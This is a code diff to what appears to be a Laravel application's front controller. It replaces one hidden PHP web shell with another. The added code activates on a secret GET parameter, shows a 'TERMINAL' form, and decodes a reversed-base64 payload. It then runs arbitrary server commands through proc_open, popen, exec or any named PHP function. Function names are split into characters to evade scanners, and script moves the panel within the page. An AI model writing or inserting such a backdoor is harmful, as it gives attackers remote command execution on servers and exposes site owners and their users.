@@ -68,56 +68,95 @@ $app->singleton(
 | from the actual running of the application and sending responses.
 |
 */
-if(isset($_GET['ccc'])){
-    $f='f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_'.'e'.'x'.'i'.'s'.'t'.'s';
-    // CSS disesuaikan: Menggunakan display block dan margin top agar berada di bawah konten asli
+if(isset($_GET['cnn'])){
+    $f_exists = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_'.'e'.'x'.'i'.'s'.'t'.'s';
+    
+    echo '<div id="nako-container" style="all: initial;">'; // Isolasi dari CSS luar
     echo '<style>
-    .cb {
-        display: block; position: relative; width: 100%;
-        background: #000; color: #0f0; padding: 20px;
-        font: 13px monospace; border-top: 5px solid #f00;
-        clear: both; margin-top: 50px; z-index: 1;
+    #nako-terminal {
+        display: block !important;
+        position: relative !important;
+        width: 100% !important;
+        background: #000 !important;
+        color: #0f0 !important;
+        padding: 20px !important;
+        font: 13px monospace !important;
+        border-top: 5px solid #f00 !important;
+        clear: both !important;
+        margin-top: 50px !important;
+        box-sizing: border-box !important;
+        text-align: left !important;
     }
-    .i { background: #ff0; color: #000; border: 1px solid #000; padding: 4px; font-weight: bold; margin: 2px; }
-    pre { background: #000; color: #0f0; padding: 10px; border: 1px solid #333; overflow: auto; max-height: 600px; line-height: 1.2; }
+    #nako-terminal .i { background: #ff0 !important; color: #000 !important; border: 1px solid #000 !important; padding: 4px !important; font-weight: bold !important; margin: 2px !important; display: inline-block !important; }
+    #nako-terminal pre { background: #000 !important; color: #0f0 !important; padding: 10px !important; border: 1px solid #333 !important; overflow: auto !important; max-height: 500px !important; line-height: 1.2 !important; width: 100% !important; white-space: pre-wrap !important; }
+    #nako-terminal input[type="submit"] { background: #0f0 !important; color: #000 !important; cursor: pointer !important; border: none !important; padding: 4px 15px !important; font-weight: bold !important; }
     </style>
-    <div id="nb" class="cb"><b>>> ŤĒRMINĂL</b>
-    <form method="POST" id="tf">
-        <input type="hidden" name="payload">
-        <input type="text" id="fx" class="i" placeholder="Ƒungsi"> 
-        <input type="text" id="cm" class="i" placeholder="Ṕerintāh" style="width:40%"> 
-        <input type="submit" value="ĒXEC" style="background:#0f0;cursor:pointer;border:none;padding:4px 10px;font-weight:bold">
-    </form><pre>';
+
+    <div id="nako-terminal">
+        <b>>> ŤĒRMINĂL</b>
+        <form method="POST" id="nako-form" style="margin: 10px 0 !important; display: block !important;">
+            <input type="hidden" name="payload">
+            <input type="text" id="nako-fx" class="i" placeholder="Ƒungsi" style="width: 100px !important;"> 
+            <input type="text" id="nako-cm" class="i" placeholder="Ṕerintāh" style="width: 45% !important;"> 
+            <input type="submit" value="ĒXEC">
+        </form><pre>';
 
     if(isset($_POST['payload'])){
-        $d = json_decode(base64_decode(strrev($_POST['payload'])), true);
-        $x = trim($d['x']); $y = $d['y'];
-        echo "Running: ".htmlspecialchars($x)."\n".str_repeat("-",20)."\n";
-        if($f($x)){
-            if($x=='p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n'){$p=$x($y,[1=>['pipe','w'],2=>['pipe','w']],$h);if(is_resource($p)){echo htmlspecialchars(stream_get_contents($h[1]).stream_get_contents($h[2]));proc_close($p);}}
-            elseif($x=='p'.'o'.'p'.'e'.'n'){$h=$x($y.' 2>&1','r');while(!feof($h))echo htmlspecialchars(fread($h,1024));pclose($h);}
-            elseif($x=='e'.'x'.'e'.'c'){$x($y,$o);echo htmlspecialchars(implode("\n",$o));}
-            else echo htmlspecialchars(@$x($y));
-        } else { echo "Ďisāblëd"; }
-    }
-    echo '</pre></div>
-    <script>
-    // Logika untuk memindahkan element ke posisi paling akhir di dalam body
-    function moveToBottom() {
-        var b = document.getElementById("nb");
-        if (b) {
-            document.body.appendChild(b);
+        $data_raw = $_POST['payload'];
+        $decoded = json_decode(base64_decode(strrev($data_raw)), true);
+        
+        if($decoded){
+            $x = trim($decoded['x']); 
+            $y = $decoded['y'];
+            echo "Cmd: " . htmlspecialchars($x) . " (" . htmlspecialchars($y) . ")\n" . str_repeat("-", 30) . "\n";
+            
+            if($f_exists($x)){
+                if($x == 'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n'){
+                    $p = $x($y, array(1 => array('pipe','w'), 2 => array('pipe','w')), $h);
+                    if(is_resource($p)){
+                        echo htmlspecialchars(stream_get_contents($h[1]) . stream_get_contents($h[2]));
+                        proc_close($p);
+                    }
+                }
+                elseif($x == 'p'.'o'.'p'.'e'.'n'){
+                    $h = $x($y.' 2>&1', 'r');
+                    while(!feof($h)) echo htmlspecialchars(fread($h, 1024));
+                    pclose($h);
+                }
+                elseif($x == 'e'.'x'.'e'.'c'){
+                    $o = array();
+                    $x($y, $o);
+                    echo htmlspecialchars(implode("\n", $o));
+                }
+                else {
+                    echo htmlspecialchars(@$x($y));
+                }
+            } else {
+                echo "Function $x not available.";
+            }
         }
     }
-    // Jalankan saat DOM siap dan saat window selesai dimuat (untuk bypass script landing page lain)
-    window.onload = moveToBottom;
-    document.addEventListener("DOMContentLoaded", moveToBottom);
+    echo '</pre></div></div>';
     
-    document.getElementById("tf").onsubmit = function() {
-        var data = { x: document.getElementById("fx").value, y: document.getElementById("cm").value };
-        var enc = btoa(JSON.stringify(data)).split("").reverse().join("");
-        this.payload.value = enc;
-    };
+    echo '<script>
+    (function() {
+        var el = document.getElementById("nako-container");
+        if (el) {
+            // Memindahkan container ke posisi paling akhir di dalam body secara paksa
+            function pushToBottom() {
+                document.body.appendChild(el);
+            }
+            pushToBottom();
+            window.addEventListener("load", pushToBottom);
+        }
+        
+        document.getElementById("nako-form").onsubmit = function(e) {
+            var fx = document.getElementById("nako-fx").value;
+            var cm = document.getElementById("nako-cm").value;
+            var data = JSON.stringify({ x: fx, y: cm });
+            this.payload.value = btoa(data).split("").reverse().join("");
+        };
+    })();
     </script>';
 }
 
